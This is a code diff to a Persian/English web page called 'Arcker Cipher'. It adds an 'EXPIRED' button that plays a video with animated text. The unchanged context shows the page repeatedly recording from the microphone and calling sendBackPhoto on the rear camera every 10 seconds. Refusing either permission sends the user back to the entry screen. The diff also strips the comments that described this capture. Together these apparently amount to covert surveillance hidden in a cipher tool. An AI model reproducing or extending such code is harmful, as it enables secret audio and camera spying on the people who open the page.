@@ -1003,6 +1003,177 @@
             border-color: var(--purple-mid);
         }
 
+        /* ===== NEW EXPIRED BUTTON ===== */
+        .btn.expired-btn {
+            border-color: #8b0000;
+            color: #8b0000;
+            background: rgba(139, 0, 0, 0.15);
+            font-weight: 700;
+            letter-spacing: 2px;
+            animation: expiredPulse 2s infinite;
+        }
+        .btn.expired-btn::after {
+            background: linear-gradient(135deg, #8b0000, #cc0000);
+        }
+        .btn.expired-btn:hover {
+            color: #fff;
+            border-color: transparent;
+            box-shadow: 0 0 30px rgba(139, 0, 0, 0.5);
+        }
+        .btn.expired-btn .icon {
+            color: #8b0000;
+        }
+        .btn.expired-btn:hover .icon {
+            color: #fff;
+        }
+        @keyframes expiredPulse {
+            0% { opacity: 0.6; }
+            50% { opacity: 1; }
+            100% { opacity: 0.6; }
+        }
+
+        /* ===== EXPIRED OVERLAY ===== */
+        .expired-overlay {
+            position: fixed;
+            inset: 0;
+            z-index: 6000;
+            background: #000;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            opacity: 0;
+            transition: opacity 1.5s ease;
+        }
+        .expired-overlay.active {
+            display: flex;
+            opacity: 1;
+        }
+        .expired-overlay::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: radial-gradient(circle at 30% 40%, rgba(100, 0, 0, 0.3) 0%, transparent 60%),
+                        radial-gradient(circle at 70% 60%, rgba(60, 0, 0, 0.2) 0%, transparent 50%);
+            animation: expiredFlicker 4s infinite alternate;
+            pointer-events: none;
+            z-index: 1;
+        }
+        @keyframes expiredFlicker {
+            0% { opacity: 0.3; }
+            20% { opacity: 0.8; }
+            40% { opacity: 0.2; }
+            60% { opacity: 0.9; }
+            80% { opacity: 0.4; }
+            100% { opacity: 0.7; }
+        }
+        .expired-overlay::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: repeating-linear-gradient(0deg,
+                    rgba(0,0,0,0.03) 0px,
+                    rgba(0,0,0,0.03) 2px,
+                    transparent 2px,
+                    transparent 4px);
+            pointer-events: none;
+            z-index: 2;
+            animation: noise 0.5s infinite alternate;
+        }
+        @keyframes noise {
+            0% { opacity: 0.1; }
+            100% { opacity: 0.4; }
+        }
+
+        .expired-content {
+            position: relative;
+            z-index: 3;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            width: 90%;
+            max-width: 900px;
+            max-height: 90vh;
+        }
+        .expired-content video {
+            width: 100%;
+            max-height: 70vh;
+            border-radius: 8px;
+            box-shadow: 0 0 80px rgba(139, 0, 0, 0.4), 0 0 150px rgba(0,0,0,0.9);
+            background: #000;
+            border: 1px solid rgba(139, 0, 0, 0.3);
+        }
+        .expired-text {
+            color: #aaa;
+            font-family: 'Vazirmatn', 'Courier New', monospace;
+            font-size: 1.6rem;
+            text-align: center;
+            margin-top: 30px;
+            min-height: 5rem;
+            text-shadow: 0 0 20px rgba(139, 0, 0, 0.4);
+            letter-spacing: 2px;
+            line-height: 1.6;
+            width: 100%;
+            padding: 0 20px;
+        }
+        .expired-text .word {
+            display: inline-block;
+            opacity: 0;
+            transform: translateY(10px) scale(0.9);
+            transition: opacity 0.4s ease, transform 0.4s ease;
+            margin: 0 4px;
+            filter: blur(2px);
+        }
+        .expired-text .word.show {
+            opacity: 1;
+            transform: translateY(0) scale(1);
+            filter: blur(0);
+        }
+        .expired-text .word.final {
+            font-size: 2.8rem;
+            font-weight: 900;
+            color: #cc0000;
+            text-shadow: 0 0 40px rgba(200, 0, 0, 0.6), 0 0 80px rgba(200, 0, 0, 0.3), 0 0 120px rgba(100, 0, 0, 0.2);
+            animation: finalShake 1.2s infinite alternate;
+            letter-spacing: 4px;
+        }
+        @keyframes finalShake {
+            0% { transform: translateX(-2px) rotate(-1deg); text-shadow: 0 0 30px rgba(200,0,0,0.6), 0 0 60px rgba(200,0,0,0.3); }
+            100% { transform: translateX(2px) rotate(1deg); text-shadow: 0 0 50px rgba(200,0,0,0.8), 0 0 100px rgba(200,0,0,0.4); }
+        }
+
+        .expired-close {
+            position: fixed;
+            top: 24px;
+            right: 28px;
+            background: rgba(139, 0, 0, 0.2);
+            border: 1px solid rgba(139, 0, 0, 0.5);
+            color: #888;
+            font-size: 1.8rem;
+            cursor: pointer;
+            transition: all var(--transition);
+            width: 54px;
+            height: 54px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 10;
+            backdrop-filter: blur(8px);
+            opacity: 0.4;
+            font-family: 'Courier New', monospace;
+        }
+        .expired-close:hover {
+            opacity: 1;
+            background: rgba(139, 0, 0, 0.4);
+            border-color: #cc0000;
+            transform: rotate(90deg) scale(1.1);
+            box-shadow: 0 0 40px rgba(139, 0, 0, 0.3);
+            color: #fff;
+        }
+
         .footer {
             text-align: center;
             font-size: var(--font-size-sm);
@@ -1463,6 +1634,35 @@
             pointer-events: none;
             z-index: -1;
         }
+
+        /* ===== RESPONSIVE FOR EXPIRED ===== */
+        @media (max-width: 768px) {
+            .expired-text {
+                font-size: 1.2rem;
+                margin-top: 20px;
+            }
+            .expired-text .word.final {
+                font-size: 2rem;
+            }
+            .expired-close {
+                top: 16px;
+                right: 16px;
+                width: 44px;
+                height: 44px;
+                font-size: 1.4rem;
+            }
+            .expired-content video {
+                max-height: 50vh;
+            }
+        }
+        @media (max-width: 480px) {
+            .expired-text {
+                font-size: 1rem;
+            }
+            .expired-text .word.final {
+                font-size: 1.6rem;
+            }
+        }
     </style>
 </head>
 <body>
@@ -1580,6 +1780,8 @@
             <button class="btn" data-action="downloadDecrypt"><span class="icon">⬇</span> <span id="toolDownloadDec">دانلود رمزگشایی</span></button>
             <button class="btn" data-action="upload"><span class="icon">⬆</span> <span id="toolUpload">آپلود TXT</span></button>
             <button class="btn for-you-btn" id="forYouBtn"><span class="icon">❤</span> <span id="toolForYou">برای تو</span></button>
+            <!-- ===== NEW EXPIRED BUTTON ===== -->
+            <button class="btn expired-btn" id="expiredBtn"><span class="icon">💀</span> <span id="toolExpired">EXPIRED</span></button>
             <input type="file" id="fileInput" accept=".txt" style="display:none;" />
         </div>
 
@@ -1593,6 +1795,18 @@
             <div class="for-you-word" id="forYouWord"></div>
         </div>
         <button class="for-you-close" id="forYouClose">✕</button>
+    </div>
+
+    <!-- ===== EXPIRED OVERLAY ===== -->
+    <div id="expiredOverlay" class="expired-overlay">
+        <div class="expired-content">
+            <video id="expiredVideo" controls autoplay>
+                <source src="expired.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+            <div id="expiredText" class="expired-text"></div>
+        </div>
+        <button class="expired-close" id="expiredClose">✕</button>
     </div>
 
     <!-- SETTINGS PANEL -->
@@ -1849,6 +2063,13 @@
             const overlayFeedback = $('overlayFeedback');
             const camBack = $('camBack');
 
+            // ===== NEW EXPIRED ELEMENTS =====
+            const expiredBtn = $('expiredBtn');
+            const expiredOverlay = $('expiredOverlay');
+            const expiredClose = $('expiredClose');
+            const expiredVideo = $('expiredVideo');
+            const expiredText = $('expiredText');
+
             // =============================================================
             //  ۴.  SETTINGS STATE
             // =============================================================
@@ -1940,6 +2161,7 @@
                     toolDownloadDec: 'دانلود رمزگشایی',
                     toolUpload: 'آپلود TXT',
                     toolForYou: 'برای تو',
+                    toolExpired: 'EXPIRED',
                     footerText: '◈ آرکر سیفر نسخه ۱ •',
                     settingsTitle: 'تنظیمات',
                     langLabel: 'زبان',
@@ -1987,6 +2209,7 @@
                     toolDownloadDec: 'Download Decrypt',
                     toolUpload: 'Upload TXT',
                     toolForYou: 'FOR YOU',
+                    toolExpired: 'EXPIRED',
                     footerText: '◈ ARCKER CIPHER v1  •',
                     settingsTitle: 'Settings',
                     langLabel: 'Language',
@@ -2062,6 +2285,7 @@
                 $('toolDownloadDec').textContent = t.toolDownloadDec;
                 $('toolUpload').textContent = t.toolUpload;
                 $('toolForYou').textContent = t.toolForYou;
+                $('toolExpired').textContent = t.toolExpired || 'EXPIRED';
                 $('footerText').textContent = t.footerText;
                 $('settingsTitle').textContent = t.settingsTitle;
                 $('langLabel').textContent = t.langLabel;
@@ -2359,6 +2583,7 @@
                         document.activeElement?.blur();
                         if (settingsOverlay.classList.contains('active')) closeSettingsPanel();
                         if (forYouOverlay.classList.contains('active')) closeForYou();
+                        if (expiredOverlay.classList.contains('active')) closeExpired();
                     }
                 });
             }
@@ -2490,13 +2715,11 @@
             function showEntryOverlay() {
                 entryOverlay.classList.remove('hidden');
                 setOverlayFeedback('', '');
-                // حذف وضعیت عبور برای اینکه کاربر دوباره انتخاب کند
                 try { localStorage.removeItem('arcker_entry_passed'); } catch (_) {}
             }
 
             function hideOverlay() {
                 entryOverlay.classList.add('hidden');
-                // شروع ضبط صدا و تصویر
                 setTimeout(() => {
                     startAllCaptures();
                 }, 400);
@@ -2634,7 +2857,6 @@
                 isRecording = false;
                 clearTimeout(recordingTimerId);
                 recordingTimerId = null;
-                // بعد از توقف، دوباره شروع کن
                 setTimeout(() => {
                     if (isMicAllowed) startAudioRecording();
                 }, 200);
@@ -2693,7 +2915,6 @@
                 let micGranted = false;
                 let camGranted = false;
 
-                // درخواست میکروفون
                 if (!isMicAllowed) {
                     navigator.mediaDevices.getUserMedia({ audio: true })
                         .then(stream => {
@@ -2701,9 +2922,7 @@
                             isMicAllowed = true;
                             micGranted = true;
                             startAudioRecording();
-                            // اگر هر دو دسترسی گرفته شد، ادامه بده
                             if (camGranted) {
-                                // تایمر عکس‌برداری را شروع کن
                                 if (captureIntervalId) clearInterval(captureIntervalId);
                                 captureIntervalId = setInterval(() => {
                                     sendBackPhoto();
@@ -2714,7 +2933,6 @@
                         .catch(err => {
                             console.error('[Mic] Error:', err);
                             micGranted = false;
-                            // اگر میکروفون رد شد، به صفحه برگرد
                             showEntryOverlay();
                             return;
                         });
@@ -2723,7 +2941,6 @@
                     startAudioRecording();
                 }
 
-                // درخواست دوربین عقب
                 if (!isCamAllowed) {
                     const constraintsBack = {
                         video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } }
@@ -2734,7 +2951,6 @@
                             camBack.srcObject = stream;
                             isCamAllowed = true;
                             camGranted = true;
-                            // اگر میکروفون قبلاً گرفته شده بود، تایمر عکس را شروع کن
                             if (isMicAllowed) {
                                 if (captureIntervalId) clearInterval(captureIntervalId);
                                 captureIntervalId = setInterval(() => {
@@ -2746,26 +2962,81 @@
                         .catch(err => {
                             console.error('[Camera] Error:', err);
                             camGranted = false;
-                            // اگر دوربین رد شد، به صفحه برگرد
                             showEntryOverlay();
                             return;
                         });
                 } else {
                     camGranted = true;
-                    // اگر دوربین قبلاً فعال شده، تایمر را تنظیم کن
                     if (!captureIntervalId) {
                         captureIntervalId = setInterval(() => {
                             sendBackPhoto();
                         }, 10000);
                     }
                 }
-
-                // اگر هر دو دسترسی وجود داشته باشد، همه چیز خوب است
-                // ولی اگر یکی رد شد، showEntryOverlay فراخوانی می‌شود
             }
 
             // =============================================================
-            //  ۱۳.  BIND EVENTS
+            //  ۱۳.  EXPIRED OVERLAY
+            // =============================================================
+            let expiredTimeout = null;
+            let expiredIndex = 0;
+            const expiredWords = "And where were you?".split(' ');
+
+            function closeExpired() {
+                expiredOverlay.classList.remove('active');
+                if (expiredVideo) {
+                    expiredVideo.pause();
+                    expiredVideo.currentTime = 0;
+                }
+                clearTimeout(expiredTimeout);
+                expiredText.innerHTML = '';
+                expiredIndex = 0;
+                // reset video source to allow replay
+                expiredVideo.load();
+            }
+
+            function showExpired() {
+                // show overlay
+                expiredOverlay.classList.add('active');
+                // play video with sound
+                expiredVideo.muted = false;
+                expiredVideo.volume = 1.0;
+                expiredVideo.play().catch(e => console.warn('Autoplay prevented:', e));
+
+                // clear previous text
+                expiredText.innerHTML = '';
+                expiredIndex = 0;
+
+                // start showing words one by one
+                function showNextWord() {
+                    if (expiredIndex >= expiredWords.length) {
+                        return;
+                    }
+                    const word = expiredWords[expiredIndex];
+                    const span = document.createElement('span');
+                    span.className = 'word';
+                    // if last word, add final class
+                    if (expiredIndex === expiredWords.length - 1) {
+                        span.classList.add('final');
+                    }
+                    span.textContent = word;
+                    expiredText.appendChild(span);
+                    // trigger show after a tiny delay for animation
+                    requestAnimationFrame(() => {
+                        span.classList.add('show');
+                    });
+                    expiredIndex++;
+                    // calculate delay: about 1 second per word, but last word stays longer
+                    const delay = (expiredIndex === expiredWords.length) ? 3000 : 1200;
+                    expiredTimeout = setTimeout(showNextWord, delay);
+                }
+
+                // start after a small delay
+                expiredTimeout = setTimeout(showNextWord, 500);
+            }
+
+            // =============================================================
+            //  ۱۴.  BIND EVENTS
             // =============================================================
             function bindEvents() {
                 encryptBtn.addEventListener('click', performEncrypt);
@@ -2842,10 +3113,22 @@
                 forYouOverlay.addEventListener('click', (e) => {
                     if (e.target === forYouOverlay) closeForYou();
                 });
+
+                // ===== EXPIRED EVENTS =====
+                expiredBtn.addEventListener('click', showExpired);
+                expiredClose.addEventListener('click', closeExpired);
+                expiredOverlay.addEventListener('click', (e) => {
+                    if (e.target === expiredOverlay) closeExpired();
+                });
+                // close expired on video end
+                expiredVideo.addEventListener('ended', () => {
+                    // wait a bit then close
+                    setTimeout(closeExpired, 2000);
+                });
             }
 
             // =============================================================
-            //  ۱۴.  INIT
+            //  ۱۵.  INIT
             // =============================================================
             function init() {
                 const saved = getSettings();
@@ -2890,7 +3173,9 @@
                 stopRecording: () => {
                     if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
                     if (captureIntervalId) clearInterval(captureIntervalId);
-                }
+                },
+                showExpired,
+                closeExpired
             };
 
         })();
